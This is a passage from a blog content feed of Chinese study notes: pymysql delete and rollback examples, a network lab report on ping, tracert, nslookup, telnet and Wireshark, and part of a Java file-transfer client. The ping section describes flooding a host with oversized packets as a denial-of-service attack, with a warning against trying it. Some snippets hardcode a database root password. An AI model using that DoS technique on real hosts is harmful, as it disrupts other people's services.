punctuation">)</span><span class="token comment">#获取游标</span>cur<span class="token operator">=</span>conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"select * from user;"</span><span class="token punctuation">)</span><span class="token comment">#删除前查询所有数据</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'删除前的数据为：'</span><span class="token punctuation">)</span><span class="token keyword">for</span> res <span class="token keyword">in</span> cur<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token keyword">print</span> <span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'*'</span><span class="token operator">*</span><span class="token number">40</span><span class="token punctuation">)</span>      cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"delete from user where id=1"</span><span class="token punctuation">)</span><span class="token comment">#删除1条数据</span><span class="token comment">#删除后查询所有数据</span>cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"select * from user;"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'删除后的数据为：'</span><span class="token punctuation">)</span><span class="token keyword">for</span> res <span class="token keyword">in</span> cur<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token keyword">print</span> <span class="token punctuation">(</span>res<span class="token punctuation">)</span>cur<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'sql执行成功'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="删除多条数据："><a href="#删除多条数据：" class="headerlink" title="删除多条数据："></a>删除多条数据：</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pymysql<span class="token comment">#打开数据库连接</span>conn<span class="token operator">=</span>pymysql<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'localhost'</span><span class="token punctuation">,</span>user<span class="token operator">=</span><span class="token string">'root'</span><span class="token punctuation">,</span>password<span class="token operator">=</span><span class="token string">'28283860'</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>select_db<span class="token punctuation">(</span><span class="token string">'pythondb'</span><span class="token punctuation">)</span>cur<span class="token operator">=</span>conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#获取游标</span>cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"select * from user;"</span><span class="token punctuation">)</span><span class="token comment">#删除前查询所有数据</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'删除前的数据为：'</span><span class="token punctuation">)</span><span class="token keyword">for</span> res <span class="token keyword">in</span> cur<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token keyword">print</span> <span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'*'</span><span class="token operator">*</span><span class="token number">40</span><span class="token punctuation">)</span><span class="token comment">#删除2条数据</span>sql<span class="token operator">=</span><span class="token string">"delete from user where id=%s"</span>cur<span class="token punctuation">.</span>executemany<span class="token punctuation">(</span>sql<span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"select * from user;"</span><span class="token punctuation">)</span><span class="token comment">#删除后查询所有数据</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'删除后的数据为：'</span><span class="token punctuation">)</span><span class="token keyword">for</span> res <span class="token keyword">in</span> cur<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token keyword">print</span> <span class="token punctuation">(</span>res<span class="token punctuation">)</span>cur<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'sql执行成功'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="事务回滚"><a href="#事务回滚" class="headerlink" title="事务回滚"></a>事务回滚</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pymysqlconn<span class="token operator">=</span>pymysql<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'localhost'</span><span class="token punctuation">,</span>user<span class="token operator">=</span><span class="token string">'root'</span><span class="token punctuation">,</span>password<span class="token operator">=</span><span class="token string">'28283860'</span><span class="token punctuation">)</span><span class="token comment">#打开数据库连接</span>conn<span class="token punctuation">.</span>select_db<span class="token punctuation">(</span><span class="token string">'pythondb'</span><span class="token punctuation">)</span>cur<span class="token operator">=</span>conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#获取游标</span>cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"select * from user;"</span><span class="token punctuation">)</span><span class="token comment">#修改前查询所有数据</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'修改前的数据为：'</span><span class="token punctuation">)</span><span class="token keyword">for</span> res <span class="token keyword">in</span> cur<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token keyword">print</span> <span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'*'</span><span class="token operator">*</span><span class="token number">40</span><span class="token punctuation">)</span>cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"update user set name='xiaoxiaoxiaoxiaoren' where id=5"</span><span class="token punctuation">)</span><span class="token comment">#更新表中第1条数据</span>cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"select * from user;"</span><span class="token punctuation">)</span><span class="token comment">#修改后查询所有数据</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'修改后的数据为：'</span><span class="token punctuation">)</span><span class="token keyword">for</span> res <span class="token keyword">in</span> cur<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token keyword">print</span> <span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'*'</span><span class="token operator">*</span><span class="token number">40</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>rollback<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#回滚事务</span>cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"select * from user;"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'回滚事务后的数据为：'</span><span class="token punctuation">)</span><span class="token keyword">for</span> res <span class="token keyword">in</span> cur<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token keyword">print</span> <span class="token punctuation">(</span>res<span class="token punctuation">)</span>cur<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'sql执行成功'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络实验报告</title>
      <link href="/2022/07/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%E6%95%B4%E7%90%86/"/>
      <url>/2022/07/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%E6%95%B4%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h2 id="实验一-网络测试命令"><a href="#实验一-网络测试命令" class="headerlink" title="实验一  网络测试命令"></a>实验一  网络测试命令</h2><p>实验目的</p><ul><li>了解网络测试命令</li></ul><p>实验内容:</p><blockquote><p>ping 命令的使用，arp命令的使用，tracert命令的使用，ipconfig命令的使用，nslookup命令的使用，telnet命令的使用</p></blockquote><h3 id="ping-命令的使用"><a href="#ping-命令的使用" class="headerlink" title="ping 命令的使用"></a>ping 命令的使用</h3><p><strong>ping/? ：</strong> ping命令使用帮助</p><p><strong>无参数 ping ：</strong></p><p>在默认情况下，一般都是只发送四个32字节数据包，通过这个命令从数据包返回的最短时间、最长时间、平均时间可以衡量网络速度、延迟，从丢失率可以衡量网络的稳定性。</p><p>bytes值：数据包大小，也就是字节。</p><p>time值：响应时间，这个时间越小，说明你连接这个地址速度越快。</p><p>TTL值：Time To Live,表示DNS记录在DNS服务器上存在的时间，它是IP协议包的一个值，告诉路由器该数据包何时需要被丢弃。可以通过Ping返回的TTL值大小，粗略地判断目标系统类型是Windows系列还是UNIX/Linux系列。</p><p><strong>ping -t的使用</strong>：不间断地Ping指定计算机，直到管理员中断。</p><p><strong>ping -a的使用</strong>：ping-a解析计算机名与NetBios名。就是可以通过ping它的ip地址，可以解析出主机名。但是在实际显示中ping -a指令的效果与ping指令完全相同。</p><p><strong>ping -n使用</strong>：ping -n在默认情况下，一般都只发送四个数据包，通过这个命令可以自己定义发送的个数，对衡量网络速度很有帮助</p><p><strong>ping -l size的使用</strong>   :  -l size：发送size指定大小的到目标主机的数据包。</p><p>在默认的情况下Windows的ping发送的数据包大小为32byt，最大能发送65500byt。当一次发送的数据包大于或等于65500byt时，将可能导致接收方计算机宕机。这个参数配合其它参数以后危害非常强大，比如攻击者可以结合-t参数实施DOS攻击**(死亡之ping)**。</p><p>不过像阿里云，腾讯云等云服务器好像都限制了对ping的带宽，但是依然不要拿去试他人的服务器。</p><h3 id="arp命令的使用"><a href="#arp命令的使用" class="headerlink" title="arp命令的使用"></a>arp命令的使用</h3><p><strong>arp -a [InetAddr] [-N ifaceAddr]</strong></p><p>arp -a将ARP缓存表内容全部输出来</p><p>Arp -a ip 将ARP缓存表中对应ip内容输出,输出的结果可能是无ARP信息,一个ARP信息,多个ARP内容。</p><p>Arp -a -n 接口地址 将ARP缓存表中该接口地址的信息全部输出,可能无ARP信息,可能是多个结果值</p><p>Arp -a 地址 -n 接口地址 将ARP缓存表指定接口地址下该ip地址内容输出,可能输出无ARP信息,或者输出一个ARP信息内容</p><p>Arp -a -v 输出所有ARP信息,包括无用的信息</p><h3 id="tracert命令的使用"><a href="#tracert命令的使用" class="headerlink" title="tracert命令的使用"></a>tracert命令的使用</h3><blockquote><p>tracert 是一个简单的网络诊断工具，可以列出分组经过的路由节点，以及它在IP 网络中每一跳的延迟。</p></blockquote><p>这里的延迟是指：分组从信息源发送到目的地所需的时间，延迟也分为许多的种类——传播延迟、传输延迟、处理延迟、排队延迟等，是大多数网站性能的瓶颈之一</p><p><strong>tracert</strong> IP   tracert命令用于确定 IP数据包访问目标所采取的路径，显示从本地到目标网站所在网络服务器的一系列网络节点的访问速度，最多支持显示30个网络节点</p><p><strong>tracert的工作原理：</strong></p><p>通过向目标发送不同IP生存时间（TTL）的ICMP回应数据包，tracert诊断程序确定到目标所采取的路由。要求路径上的每个路由器在转发数据包之前至少将数据包上的TTL值减</p><p>数据包上的TTL减为0时，路由器应该将“ICMP已超时”的消息发回原系统。</p><p>先发送TTL为1的回应数据包，并在随后的每次发送过程中将TTL加1，直到目标响应或TTL达到最大值，从而确定路由。通过检测中间路由器发回的“ICMP包已超时”的消息确定路由。</p><p><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml30884\wps1.jpg" alt="img"></p><blockquote><p>192.168.81.1来自本地局域网<br>219.218.31.233来自山东省日照市 教育网<br>222.174.155.17来自山东省日照市东港区 电信<br>60.235.162.137来自山东省日照市 电信<br>60.235.161.185来自山东省日照市 电信<br>60.235.160.17来自山东省日照市 电信</p><p>202.97.94.57来自 电信<br>101.95.209.218来自上海市上海 电信<br>180.163.53.70来自上海市上海 电信<br>116.251.117.177来自浙江省杭州市 阿里云<br>140.205.220.96来自上海市上海 阿里云</p><p>这里的截图是在课后补充的，课后复现没有像课上实验那样顺利。</p></blockquote><p><strong>tracert /?</strong> ：ping命令使用帮助</p><h3 id="ipconfig命令的使用"><a href="#ipconfig命令的使用" class="headerlink" title="ipconfig命令的使用"></a>ipconfig命令的使用</h3><p><strong>无参数ipconfig</strong></p><center><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml30884\wps2.jpg" alt="img" style="zoom:80%;" /> </center>**Ipconfig /all** : 显示详细信息    这个长度比ipconfig还长这个图片就不放了...... <p><strong>ipconfig /renew</strong>:更新所有适配器</p><center><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml30884\wps3.jpg" alt="img"  /> </center>**ipconfig/showclassid**：显示网络适配器的DHCP类别信息<h3 id="nslookup命令的使用"><a href="#nslookup命令的使用" class="headerlink" title="nslookup命令的使用"></a>nslookup命令的使用</h3><p>nslookup用于查询DNS的记录，查询域名解析是否正常，在网络故障时用来诊断网络问题</p><p>直接查询：</p><center><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml30884\wps4.jpg" alt="img" style="zoom:100%;" /> </center>**查询其他记录：**nslookup -qt = type domain [dns-server]<pre class="line-numbers language-none"><code class="language-none">A --&gt;地址记录AAAA  --&gt;地址记录AFSDB Andrew   --&gt;文件系统数据库服务器记录ATMA --&gt;ATM地址记录CNAME  --&gt;别名记录HINHO  --&gt;硬件配置记录，包括CPU、操作系统信息 ISDN  --&gt;域名对应的ISDN号码MB  --&gt;存放指定邮箱的服务器MG   --&gt;邮件组记录MINFO  --&gt;邮件组和邮箱的信息记录MR  --&gt;改名的邮箱记录MX  --&gt;邮件服务器记录NS  --&gt; 名字服务器记录PTR   -&gt;反向记录RP   --&gt;负责人记录RT  --&gt;路由穿透记录SRV   --&gt;TCP服务器信息记录TXT  --&gt;域名对应的文本信息X25  --&gt;域名对应的X.25地址记录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="telnet命令的使用"><a href="#telnet命令的使用" class="headerlink" title="telnet命令的使用"></a>telnet命令的使用</h3><p>1、点击开始　→　运行　→　输入CMD，回车。</p><p>2、在出来的DOS界面里，输入telnet测试端口命令： telnet IP 端口 或者 telnet 域名 端口，回车。</p><p>如果端口关闭或者无法连接，则显示不能打开到主机的链接，链接失败；端口打开的情况下，链接成功，则进入telnet页面（全黑的），证明端口可用。</p><p>Telnet 客户端命常用命令：</p><pre class="line-numbers language-none"><code class="language-none">open : 使用 openhostname 可以建立到主机的 Telnet 连接。close : 使用命令 close 命令可以关闭现有的 Telnet 连接。display : 使用 display 命令可以查看 Telnet 客户端的当前设置。send : 使用 send 命令可以向 Telnet 服务器发送命令。支持以下命令：ao : 放弃输出命令。ayt : “Are you there”命令esc : 发送当前的转义字符。ip : 中断进程命令。synch : 执行 Telnet 同步操作。brk : 发送信号。quit ：使用 quit 命令可以退出 Telnet 客户端。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml30884\wps5.jpg" alt="img" style="zoom:67%;" /><h2 id="实验二-协议分析"><a href="#实验二-协议分析" class="headerlink" title="实验二 协议分析"></a>实验二 协议分析</h2><p>实验目的:</p><blockquote><p>了解Wireshark使用方法，分析ping协议工作过程，分析TCP/IP/UDP任意两个协议的语法和语义</p></blockquote><p>实验内容:</p><blockquote><p>安装并使用wireshark，验证TCP/IP等协议的语法语义。</p></blockquote><p>实验步骤</p><p>安装并了解wireshark的使用方法</p><p><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml30884\wps6.jpg" alt="img"></p><p>这边我因为之前网安学习的过程中，我对wireshark的基本使用还算了解，虽然用的不是很多….</p><ul><li>分析ping协议工作过程</li></ul><p>ping命令执行的时候，源主机首先会构建一个ICMP回送请求消息的数据包。</p><p>ICMP数据包内包含多个字段，最重要的是类型和序号这两个字段：</p><p>类型：应为是回送请求，该字段为8；</p><p>序号：用于区分连续ping的时候发出的多个数据包（序号从0开始，每发送一个新的回送请求就加1）并且为了能够计算往返时间RTT，它会在报文的数据部分插入发送时间。然后，由ICMP协议将这个数据包连同地址192.168.81.54一起交给IP层，IP层将192.168.81.54作为目的地址，本机IP地址作为源地址，协议字段设置为1表示是ICMP协议，再加上一些其他控制消息，构建一个IP数据包。</p><p>接下来，需要加入MAC头。如果在本地ARP映射表中查找出IP地址192.168.81.54所对应的MAC地址，则可以直接使用；如果没有，则需要发送ARP协议查询MAC地址，获得MAC地址后，由数据链路层构建一个数据帧，目的地址是IP层传过来MAC地址，源地址则是本机的MAC地址；还要附加上一些控制信息，依据以太网的介质访问规则，将他们传送出去。<br>主机B收到这个数据帧后，先检查他的目的MAC地址，并和自己的MAC地址对比，如果符合则接收，否则就放弃。</p><p>接收后检查该数据帧，将IP数据包从帧中提取 出来，交给本机IP层。同样，IP层检查后，将有用信息提取后交给ICMP协议。</p><p>主机B会构建一个ICMP回送响应消息数据包，回送响应包的类型字段为0，序号为接收到请求数据包中的序号，然后再发送出去给主机A。</p><p>在规定的时间内，源主机如果没有接到ICMP的应答包，则说明目标主机不可达；如果接受到了ICMP回送响应消息，则说明目标主机可达。</p><p>此时，源主机会检查，用当前时刻减去该数据包最初从源主机上发出的时刻，就是ICMP数据包的时间延迟。</p><ul><li>分析TCP/IP/UDP任意两个协议的语法和语义</li></ul><p>1.TCP协议</p><p><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml30884\wps7.jpg" alt="img"></p><p>先了解TCP协议的结构:</p><blockquote><p>来源连接端口（16位长）－识别发送连接端口<br>目的连接端口（16位长）－识别接收连接端口<br>序列号（seq，32位长）<br>如果含有同步化旗标（SYN），则此为最初的序列号；第一个数据比特的序列码为本序列号加一。<br>如果没有同步化旗标（SYN），则此为第一个数据比特的序列码。<br>确认号（ack，32位长）—期望收到的数据的开始序列号。也即已经收到的数据的字节长度加1。<br>数据偏移（4位长）—以4字节为单位计算出的数据段开始地址的偏移值。<br>保留（3比特长）—须置0<br>标志符（9比特长）<br>窗口（WIN，16位长）—表示从确认号开始，本报文的发送方可以接收的字节数，即接收窗口大小。用于流量控制。<br>校验和（Checksum，16位长）—对整个的TCP报文段，包括TCP头部和TCP数据，以16位字进行计算所得。这是一个强制性的字段。<br>紧急指针（16位长）—本报文段中的紧急数据的最后一个字节的序号。<br>选项字段—最多40字节。每个选项的开始是1字节的kind字段，说明选项的类型。<br>发送端的时间戳（Timestamp Value field，TSval，4字节）<br>时间戳回显应答（Timestamp Echo Reply field，TSecr，4字节）</p></blockquote><p>通过wireshark看下TCP包在wireshark中的显示，过滤一下TCP包，通过直接去看TCP包文件结构</p><p><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml30884\wps8.jpg" alt="img"></p><p>Source Port:53096 源端口53096，目的端口8080，序列号4357确定序列号12417，header Length28 bytes 含固定20直接加可变8字节。</p><p>2.IP协议</p><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml30884\wps9.jpg" alt="img" style="zoom:67%;" /><p>开启wireshark进行抓包，先在CMD页面中使用ping命令ping一下WWW.baidu.com,在wireshark中过滤出icmp流的内容。</p><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml30884\wps10.jpg" alt="img" style="zoom:67%;" /><p> A. 第一行，帧Frame  指的是要发送的数据块，数据在网络上是以很小的称为帧（Frame）的单位传输的，帧由几部分组成，不同的部分执行不同的功能。其中，所抓帧的序号为592，捕获字节数等于传送字节数：74字节；</p><p>B. 第二行，以太网，以太网是一种计算机局域网技术，是数据链路层。源Mac地址为98:af:65:c6:f2:dc；目标Mac地址为00:00:00:00:00:01；</p><p>C. 第三行，IPV4协议，IPv4是一种无连接的协议，操作在使用分组交换的链路层（如以太网）上，是网络层；源IP地址为10.202.73.146；目标IP地址为39.156.66.18；</p><p><strong>Frame信息分析</strong></p><p>Arrival Time：到达时间，EPoch Time：信息出现时间，[Time delta from previous captured frame: 0.001472000 seconds] ：与之前捕获的数据帧时间差秒；[Time delta from previous displayed frame: 0.001472000 seconds]：与之前显示的帧时间差：0.001472000秒；Frame Number: 1，帧编号为1；Frame Length: 571 bytes (4568 bits)，帧长度为571字节；Capture Length: 74 bytes (592 bits)，捕获到的长度为74 字节；[Frame is marked: False]，帧标记：无；[Frame is ignored: False]，帧被忽略：无；[Protocols in frame: eth:ip:tcp:data]，协议帧：eth(以太网)、IP、tcp、data，[Coloring Rule Name: TCP]，色彩规则名称：TCP；[Coloring Rule String: tcp]，色彩规则字符串：TCP；</p><p><strong>EthernetⅡ信息分析</strong></p><p>Destination: Huawei_00:00:01(00:00:00:00:00:01)，目标Mac地址为00:00:00:00:00:01</p><p>Source: AzureWav_c6:f2:dc (98:af:65:c6:f2:dc)，源Mac地址为98:af:65:c6:f2:dc</p><p>Type: IPv4 (0x0800)，类型是IP数据包</p><h2 id="实验三-网络通信程序"><a href="#实验三-网络通信程序" class="headerlink" title="实验三 网络通信程序"></a>实验三 网络通信程序</h2><p>1.实验目的</p><p>• 理解客户服务器（C/S）方式的工作原理；</p><p>• 开发一个聊天程序：包含客户端和服务器端；</p><p>• 编程语言不限；</p><p>要能在两台PC上运行</p><p><strong>实验内容:</strong></p><ul><li>理解客户服务器（C/S）方式的工作原理；</li><li>开发一个聊天程序：包含客户端和服务器端；</li><li>编程语言不限；</li><li>要能在两台PC上运行</li></ul><p><strong>4.</strong> <strong>实验步骤</strong></p><p>客户机/服务器系统 Client/server system 简称C/S系统。是一类按新的应用模式运行的分布式计算机系统。现在的LAN，Internet提供的多种服务都是这种模式。C是指CLIENT客户机S是指SERVER服务器。</p><p>在这个应用模式中，用户只关心完整地解决自己的应用问题，而不关心这些应用问题由系统中哪台或哪几台计算机来完成。在C/S系统中，能为应用提供服务(如文件服务，打印服务，拷贝服务，图象服务，通信管理服务等)的计算机或处理器，当其被请求服务时就成为服务器。一台计算机可能提供多种服务，一个服务也可能要由多台计算机组合完成。与服务器相对，提出服务请求的计算机或处理器在当时就是客户机。从客户应用角度看，这个应用的一部分工作在客户机上完成，其他部分的工作则在(一个或多个)服务器上完成。</p><h3 id="客户端程序"><a href="#客户端程序" class="headerlink" title="客户端程序"></a>客户端程序</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">DataOutputStream</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">File</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">FileInputStream</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">Socket</span><span class="token punctuation">;</span><span class="token comment">/**文件传输Client端&lt;br>*/</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">FileTransferClient</span> <span class="token keyword">extends</span> <span class="token class-name">Socket</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">String</span> SERVER_IP <span class="token operator">=</span> <span class="token string">"219.218.21.89"</span><span class="token punctuation">;</span> <span class="token comment">// 服务端IP</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">int</span> SERVER_PORT <span class="token operator">=</span> <span class="token number">8899</span><span class="token punctuation">;</span> <span class="token comment">// 服务端端口</span>    <span class="token keyword">private</span> <span class="token class-name">Socket</span> client<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">FileInputStream</span> fis<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">DataOutputStream</span> dos<span class="token punctuation">;</span>    <span class="token comment">//构造函数&lt;br/> 与服务器建立连接  @throws Exception</span>    <span class="token keyword">public</span> <span class="token class-name">FileTransferClient</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">super</span><span class="token punctuation">(</span>SERVER_IP<span class="token punctuation">,</span> SERVER_PORT<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>client <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Cliect[port:"</span> <span class="token operator">+</span> client<span class="token punctuation">.</span><span class="token function">getLocalPort</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"] 成功连接服务端"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 向服务端传输文件 @throws Exception</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">sendFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">File</span> file <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token string">"E:\\test.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>file<span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                fis <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">;</span>                dos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DataOutputStream</span><span class="token punctuation">(</span>client<span class="token punctuation">.</span><span class="token function">getOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment">// 文件名和长度</span>                dos<span class="token punctuation">.</span><span class="token function">writeUTF</span><span class="token punctuation">(</span>file<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                dos<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                dos<span class="token punctuation">.</span><span class="token function">writeLong</span><span class="token punctuation">(</span>file<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                dos<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment">// 开始传输文件</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"======== 开始传输文件 ========"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">int</span> length <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                <span class="token keyword">long</span> progress <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>length <span class="token 